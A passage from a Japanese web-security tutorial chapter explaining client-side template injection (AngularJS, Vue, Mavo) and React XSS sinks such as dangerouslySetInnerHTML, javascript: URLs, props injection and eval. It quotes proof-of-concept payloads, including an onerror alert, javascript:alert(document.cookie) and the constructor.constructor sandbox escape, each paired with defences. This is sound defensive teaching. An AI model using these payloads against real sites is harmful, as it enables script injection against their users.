Vue.jsは通常、テンプレートのコンパイルをビルド時（Single File Component）に行うため実運用でのCSTIは限定的だが、`v-html` に生の文字列テンプレートを動的に渡す実装や、ランタイムコンパイラを使う構成（CDN版Vueなど）では同種のリスクが生じる。

また、より小規模なテンプレートライブラリであるMavo（宣言的なデータバインディングを提供するフレームワーク）についても、`[7*7]`（`49` に評価されるかで検出）、`[(1,alert)(1)]`（カンマ演算子を使い `alert(1)` を評価させる）、`[self.alert(1)]`、属性ベースの `<a data-mv-if='1 or self.alert(1)'>test</a>` といったペイロードが報告されている。

> 出典: Client Side Template Injection (CSTI) - HackTricks — https://hacktricks.wiki/en/pentesting-web/client-side-template-injection-csti.html

### 検出方法（診断時のプローブ）

実際の診断では、まず副作用のない算術式を注入し、評価結果が反映されるかを確認する。

```
{{ 7-7 }}
```

脆弱なテンプレートエンジンがこれを処理すると出力に `0` が表示され、安全な実装ではそのまま `{{ 7-7 }}` という文字列がエスケープされて表示される。これはSSTI診断で `${7*7}` のような式を使うのと全く同じ発想であり、まず「テンプレートとして評価されているか」を無害な形で確認し、確認できてから `constructor.constructor(...)` のような実害あるペイロードに進む、という手順を踏む。

### 防御策

HackTricksとBeyond XSS双方が強調する最も重要な防御原則は次の一点に尽きる。

- **ユーザー入力をテンプレート文字列そのものとして扱わない**。テンプレートは開発者が記述する「コード」であり、ユーザー入力は常に「データ」としてバインディング変数経由でテンプレートに渡す。文字列連結でテンプレートHTML自体を組み立てる実装（前述の脆弱コード例のように `Hello, <?php echo ... ?>` をAngularJSのコンパイル対象領域に出力する）を避ける。
- HTMLエスケープ（`htmlspecialchars` など）はCSTIの防御にならない。エスケープ対象外の文字（`{`、`}` など）だけでテンプレート構文が成立してしまうため、XSS対策としてのエスケープとCSTI対策は別軸で考える必要がある。
- フレームワークが提供するテンプレートサンドボックス機能がある場合はそれを有効にする。ただしAngularJSの事例が示す通り、ブラックリスト型のサンドボックスは回避策の発見によって陳腐化するため、根本対策にはならない。
- 可能であればAngularJS 1.x系のような、サンドボックスが撤廃済み・保守が終了したフレームワークからの移行を検討する。

### まとめ

CSTIは「エスケープしたのに実行される」という、通常のXSS対策の常識を裏切る脆弱性クラスである。その本質は、ブラウザのHTMLパーサとは別に、アプリケーションが信頼して読み込んでいるテンプレートエンジン自身の式評価器が第二の攻撃対象になるという点にあり、mXSS（パーサの二重解釈）やDOM Clobbering（信頼された変数名の乗っ取り）と並んで、「一次防御であるHTMLエンコード／サニタイズをすり抜けて、別のレイヤーで信頼が崩れる」パターンの一つとして理解しておくと、他の脆弱性クラスとの位置づけが整理しやすい。AngularJSのサンドボックス撤廃（1.6以降）という歴史的経緯は、ブラックリスト型の緩和策がいずれ限界を迎え、設計自体の変更（信頼境界の見直し）に行き着くという、Webセキュリティ全般に通じる教訓でもある。

---

## React/AngularのXSS(dangerouslySetInnerHTML等)

モダンなフロントエンドフレームワークは「デフォルトでHTMLエスケープする」ことでXSSを大幅に減らした。しかしそれは「XSSが起きなくなった」という意味ではない。フレームワークが提供する**エスケープを迂回するための正規の抜け道**——React の `dangerouslySetInnerHTML`、AngularJS の式評価(テンプレート)エンジン——を経由すれば、依然として任意のHTML/JSを実行できる。本節では、これらのフレームワーク固有のシンク(sink、脆弱性が発火する注入先)を仕組みレベルで見ていく。

### Reactの防御モデルとその境界線

Reactは `<div>{userInput}</div>` のようにJSXの子要素として値を埋め込むと、内部で `document.createTextNode` 相当の処理を行い、HTMLとして再解釈されないようテキストノードとして挿入する。これによって典型的な「`<script>`タグを注入する」パターンのXSSはほぼ防げる。

しかし、この保護は**JSXの「子要素」位置に限定**されている。React の内部実装は `React.createElement(type, props, ...children)` という関数呼び出しに変換され、保護されるのは `children` 引数の文字列描画だけであり、`type`(要素の種類)と `props`(属性オブジェクト)は基本的にエスケープされずにそのまま扱われる。

> 出典: React XSS Vulnerabilities & Mitigation — https://web-security-react.readthedocs.io/en/latest/pages/xss_in_react.html

つまり「JSXを使っていれば安全」という理解は誤りで、**どの引数に何が渡っているか**を見なければ安全性は判断できない。以下、具体的なシンクを4種類に分けて説明する。

#### シンク1: `dangerouslySetInnerHTML`

Reactの中で唯一、意図的に生のHTML文字列をDOMに挿入するために用意されたAPIが `dangerouslySetInnerHTML` である。名前に "dangerously" と入っているのは、React開発チームが意図的に「危険であることをコード上で自己主張させる」ために選んだ命名であり、レビューやgrepで見つけやすくする設計意図がある。

```jsx
// 脆弱なパターン
return (<p dangerouslySetInnerHTML={{__html: review}}></p>);
```

`review` がユーザー入力(商品レビューなど)であれば、次のような入力がそのままDOMに挿入され、`<img>` タグの `onerror` イベントハンドラとしてJavaScriptが実行される。

```html
<img src="nonexistent.png" onerror="alert('XSS')" />
```

なぜ動くか: `dangerouslySetInnerHTML={{__html: ...}}` は内部で対象ノードの `innerHTML` プロパティへの代入と等価な処理を行う。`innerHTML` へ文字列を渡すとブラウザのHTMLパーサが起動し、文字列を実際のDOM要素として構築する。存在しない画像パスを指定すれば `error` イベントが発火し、そのハンドラとして登録された `onerror` 属性の中身がJavaScriptとして実行される。これはReact固有の脆弱性ではなく、`innerHTML` という**HTMLパーサ再解釈を伴うシンク**そのものが持つ性質であり、Reactは単にそこへ到達する経路を明示的なAPIとして用意しているだけである。

> 出典: React XSS Vulnerabilities & Mitigation — https://web-security-react.readthedocs.io/en/latest/pages/xss_in_react.html
> 出典: Preventing XSS in React (Part 2) — https://pragmaticwebsecurity.com/articles/spasecurity/react-xss-part2.html

**対策: DOMPurify によるサニタイズ**

Reactコミュニティで事実上標準となっている対策は、`innerHTML` に渡す前にHTMLサニタイザ(パーサベースでHTML構造を理解し、危険な要素・属性だけを取り除くライブラリ)である DOMPurify を通すことである。

```jsx
const DOMPurify = require('dompurify')(window);
return (<p dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(review)}}></p>);
```

DOMPurifyは正規表現によるブラックリスト方式ではなく、ブラウザ自身のHTMLパーサ(`DOMParser`や一時的な`<template>`要素)を使って文字列を実際にDOM木として構築し、そのDOM木を走査しながら許可されていないタグ・属性・スキームを除去してから文字列に戻す、という「パースしてから判定する」アプローチを取る。これにより、mXSS(パーサの再解釈差分を突く攻撃、詳細は第4章)のような、文字列レベルのフィルタでは検出できないクラスの攻撃にも一定の耐性を持つ。サーバーサイドレンダリング(Node.js、DOMを持たない環境)では `isomorphic-dompurify` を用いる。

> 出典: Preventing XSS in React (Part 2) — https://pragmaticwebsecurity.com/articles/spasecurity/react-xss-part2.html

**実例: Signalのケース**

実際のプロダクトでも `dangerouslySetInnerHTML` の扱いを誤った結果としてXSSが発生した事例として、エンドツーエンド暗号化メッセージングアプリ Signal のデスクトップ版が挙げられている。セキュアな通信を売りにするアプリであっても、フロントエンドのレンダリング層でHTMLを未サニタイズのまま挿入すれば、暗号化そのものとは無関係にXSSが成立しうるという教訓的な事例である。

> 出典: Preventing XSS in React (Part 2) — https://pragmaticwebsecurity.com/articles/spasecurity/react-xss-part2.html

#### シンク2: `href` / `formaction` へのURLスキーム注入

JSXの子要素として文字列を埋め込む場合とは異なり、`href` や `formaction` といった属性値に外部入力をそのまま渡すと、`javascript:` スキームが素通りする。

```jsx
<a href={userInput}>Link</a>
<button formaction={userInput} />
```

`userInput` に `javascript:alert(document.cookie)` を渡された場合、Reactはこれを文字列としてそのまま`href`属性に設定する。JSXの子要素エスケープはHTMLタグの挿入を防ぐためのものであり、「属性値として妥当なURLかどうか」までは検証しない。ユーザーがそのリンクをクリックした瞬間、ブラウザは `href` の値を `javascript:` プロトコルハンドラとして解釈し、右辺の式をページのコンテキストで評価する。`<a>` だけでなく、フォーム送信先を上書きする `formaction` 属性も同様の危険を持つ。

対策としては、URLをサーバーサイド・クライアントサイド双方で検証し、`javascript:` `data:` `vbscript:` などの危険なスキームを拒否し、`http:` `https:` `mailto:` など安全なスキームのみを許可するアローリスト方式を取ることが推奨される。

> 出典: React XSS Vulnerabilities & Mitigation — https://web-security-react.readthedocs.io/en/latest/pages/xss_in_react.html

#### シンク3: `React.createElement` へのprops丸ごと注入

やや見落とされがちなのが、ユーザー由来のオブジェクトをそのままpropsとして展開してしまうケースである。

```jsx
attacker_props = JSON.parse(stored_value); // dangerouslySetInnerHTML を含みうる
React.createElement("span", attacker_props);
```

サーバーから取得したJSON、あるいはlocalStorageに保存された値をパースしてそのままコンポーネントのpropsとして渡すコードは珍しくない。もし攻撃者がその値に `{"dangerouslySetInnerHTML": {"__html": "<img src=x onerror=alert(1)>"}}` のようなキーを混入できれば、開発者がJSX上で明示的に `dangerouslySetInnerHTML` を書いていなくても、実行時にそのプロパティがReact要素に付与され、シンク1と同じ経路でXSSが成立する。これは第4章で扱ったプロトタイプ汚染やDOM Clobberingと同じ発想——「攻撃者が本来アプリが想定していない構造をデータ経由で注入する」——のReact版である。

対策は、外部から得たオブジェクトを無検証でpropsに展開しない、propsのスキーマを型やバリデーションライブラリ(Zodなど)で厳格に絞り込み、想定外のキー(特に `dangerouslySetInnerHTML` や `ref`)を許可しないことである。

> 出典: React XSS Vulnerabilities & Mitigation — https://web-security-react.readthedocs.io/en/latest/pages/xss_in_react.html

#### シンク4: `eval()` / `new Function()`

フレームワーク云々以前の古典的なシンクだが、Reactアプリのコード中に混入していることがある。

```jsx
eval(this.state.attacker_supplied);
new Function("..." + attacker_supplied + "...");
```

`eval` や `Function` コンストラクタは文字列をJavaScriptコードとしてコンパイル・実行する。ユーザー入力がその文字列の一部にでも混入すれば、任意コード実行に直結する。JSXの自動エスケープは「DOMへの描画」に関するものであり、こうした「文字列をコードとして評価する」経路には一切関与しないため、フレームワークによる保護は期待できない。対策は原則として「使わない」の一択であり、動的なロジック分岐が必要な場合はマッピングテーブル(オブジェクトのキーで分岐する等)で代替する。

> 出典: React XSS Vulnerabilities & Mitigation — https://web-security-react.readthedocs.io/en/latest/pages/xss_in_react.html

### AngularJSのCSTI(クライアントサイドテンプレートインジェクション)

Angular系フレームワークで固有の攻撃として知られるのが CSTI(Client-Side Template Injection、クライアントサイドテンプレートインジェクション)である。これはサーバーサイドのテンプレートインジェクション(SSTI、例えばJinja2やTwigのテンプレート構文を注入する攻撃)とロジックは同型だが、**評価がサーバーではなくブラウザ上のJavaScriptエンジンで行われる**点が異なる。

AngularJS(Angular 1.x系)はHTML内に `{{ }}` で囲まれた「Angular式」を書くと、それをスコープ変数に対して評価し結果を描画するテンプレートエンジンを持つ。

```html
<div>{{ 1 + 1 }}</div>  <!-- 画面には 2 と表示される -->
```

もしアプリケーションがユーザー入力を「テンプレート文字列そのもの」としてDOMに挿入し、それをAngularがコンパイル対象として拾ってしまうと(例えば `$compile` に渡す、あるいはユーザー入力を含むHTML断片を後からDOMに挿入してAngularJSのディレクティブが再スキャンする)、攻撃者は `{{ }}` の中に任意のAngular式を書き込める。これがCSTIの基本形である。検出手法として、`{{7*7}}` を入力欄に送り込み、画面に文字列 `{{7*7}}` がそのまま表示されるのではなく `49` という計算結果が表示されれば、その入力がAngular式として評価される場所に流れ込んでいる証拠になる、という古典的なテストが使われる。

> 出典: AngularJS Client-Side Template Injection (CSTI) Lab — https://github.com/MrT3acher/angularjs-client-side-template-injection-lab

#### サンドボックスと脱出の歴史

AngularJS 1.xは、`{{ }}` 式の中で `window` や `document`、任意の関数コンストラクタへ直接アクセスできないよう「Angular式サンドボックス」という制限機構を実装していた。これは式の評価結果を許可されたプロパティチェーンに限定しようとするブラックリスト的な仕組みであり、バージョンを追うごとに脱出手法(サンドボックスバイパス)が発見され、その都度パッチが当てられるという「いたちごっこ」の歴史をたどった。

`angularjs-client-side-template-injection-lab` は、この歴史の中でも代表的な脆弱バージョンである **AngularJS 1.0.8 / 1.3.20 / 1.5.8** を対象に、各バージョンごとに異なるサンドボックス回避手法を実際に手を動かして確認できるラボ環境として構成されている。バージョンごとにディレクトリが分かれており、当時のサンドボックス実装の違い・回避テクニックの違いを比較できる構成になっている。

> 出典: AngularJS Client-Side Template Injection (CSTI) Lab — https://github.com/MrT3acher/angularjs-client-side-template-injection-lab

いずれのバージョンでも脱出の基本発想は共通しており、「サンドボックスが直接ブロックしているプロパティ名を避けつつ、JavaScriptのプロトタイプチェーンを辿って `Function` コンストラクタに到達する」というものである。よく知られた到達経路が `constructor.constructor` のチェーンである。

```
{{constructor.constructor('alert(1)')()}}
```

なぜ動くか: JavaScriptでは、任意のオブジェクトインスタンスは `.constructor` プロパティ経由で自分を生成した関数(ここでは配列やオブジェクトの場合 `Array`/`Object` など)にアクセスできる。さらにその関数自身も `Function` オブジェクトのインスタンスなので、`.constructor` を**もう一段**辿ると `Function` コンストラクタそのものに到達する。`Function('alert(1)')` は文字列 `'alert(1)'` を本体とする新しい関数を動的に生成する、`eval` とほぼ同義の機能であり、末尾の `()` で即座にそれを呼び出している。サンドボックスは `window` や `document` といった具体的な危険プロパティ名をブロックリストで塞ごうとしていたが、`constructor` という一般的すぎるプロパティ名までは塞ぎきれず、プロトタイプチェーンを辿るこの経路は長らく有効な脱出手段であり続けた。

この`constructor.constructor`パターンは、AngularJSに限らず「文字列をテンプレート式として評価するあらゆるエンジン」で使い回される汎用的な攻撃発想であり、CSTIの理解において最も重要な一行と言ってよい。

#### サンドボックスの全廃(AngularJS 1.6以降)

いたちごっこの結末として、AngularJSチームは2017年にリリースされた **1.6.0** で、このサンドボックス機構そのものを完全に撤廃した。個別のバイパスを塞ぎ続けるのではなく、「サンドボックスは偽の安心感を与えるだけで本質的に破られ続ける」という判断のもと、式評価の制限自体をなくし、代わりに「そもそもユーザー入力をテンプレートとして評価させない」という設計指針にシフトした。したがって1.6以降では、上記のような`{{constructor.constructor(...)}}`型の式は最初から**制限なく**動作してしまう——つまりサンドボックスがない以上、脱出うんぬん以前に、ユーザー入力がテンプレートとしてコンパイルされる経路さえ存在すれば即座にコード実行に至る。

> 出典: Weaponising AngularJS Sandbox Bypasses (検索結果より参照) — https://medium.com/redteam/weaponising-angularjs-bypasses-4e59790a730a

このため現在の防御指針は「サンドボックスに依存しない」ことが大前提であり、次の3点に集約される。

1. **ユーザー入力を `$compile` に渡さない、あるいはテンプレートとして再解釈されるDOM挿入経路(`ng-bind-html` に生のHTMLを渡す、後からinnerHTMLでAngular属性付きのHTMLを追加する等)を避ける。**
2. Angular(2以降、AngularJSとは別系統のフレームワーク)を使う場合は `bypassSecurityTrustHtml` などの `DomSanitizer` の「信頼済みとしてマークする」APIを不用意に使わない。これは名前の通りAngularの自動サニタイズを明示的にオフにするAPIであり、ユーザー入力に対して呼び出せば防御ごと無効化される。
3. CSP(Content Security Policy)で `unsafe-eval` を許可しない。AngularJSのテンプレートコンパイラは内部的に動的コード生成に依存する部分があり、CSPの `unsafe-eval` 拒否設定と衝突するケースがあるため、フレームワークのバージョンやCSP互換モードの確認が必要になる(詳細は第4章のCSP関連セクションを参照)。
4. 可能であれば保守が終了したAngularJS(1.x系は2022年に公式サポートが終了している)から、モダンなAngular(2+)やReact等、デフォルトでテンプレート文字列としての式評価を行わないフレームワークへ移行する。

> 出典: AngularJS Client-Side Template Injection (CSTI) Lab — https://github.com/MrT3acher/angularjs-client-side-template-injection-lab

### まとめ: フレームワークXSSに共通する見方

ReactもAngularJSも、デフォルトの経路(JSXの子要素、Angularの通常のバインディング式)は概ね安全に設計されている。しかし両者とも「開発者が明示的に、あるいは無自覚に安全機構を迂回できるAPI」を提供しており、実際の脆弱性のほとんどはそこに集中する。監査・診断の観点では、コードベース中で次のキーワードをgrepすることが最初の一手になる。

- React: `dangerouslySetInnerHTML`、`createElement` への動的props展開、`href`/`formaction`への未検証な値の束縛、`eval`/`new Function`
- AngularJS: `$compile`、`ng-bind-html`、`$sce.trustAsHtml`、テンプレート文字列の動的生成、そして`{{ }}`がユーザー入力を含むHTML断片としてDOMに挿入されていないか

いずれも「フレームワークの自動防御を自分でオフにするスイッチ」であり、そのスイッチの入力元をたどることがフレームワーク時代のXSS診断の基本動作になる。

---

（前章: [第4章 高度なXSS](./04-advanced.md)　｜　次章: [第6章 実例ライトアップ](./06-writeups.md)　｜　[目次](./index.md)）
